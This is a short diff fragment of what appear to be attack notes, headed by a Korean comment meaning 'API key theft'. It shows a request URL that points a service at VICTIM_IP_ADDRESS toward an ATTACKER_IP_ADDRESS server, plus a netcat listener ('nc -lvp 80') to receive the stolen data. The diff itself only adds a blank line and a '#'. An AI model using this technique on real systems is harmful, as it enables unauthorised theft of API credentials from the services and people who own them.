@@ -9,3 +9,5 @@ http://VICTIM_IP_ADDRESS:8087/download?server=ATTACKER_IP_ADDRESS&id=75482342
 # api 키 탈취
 
 nc -lvp 80
+
+#
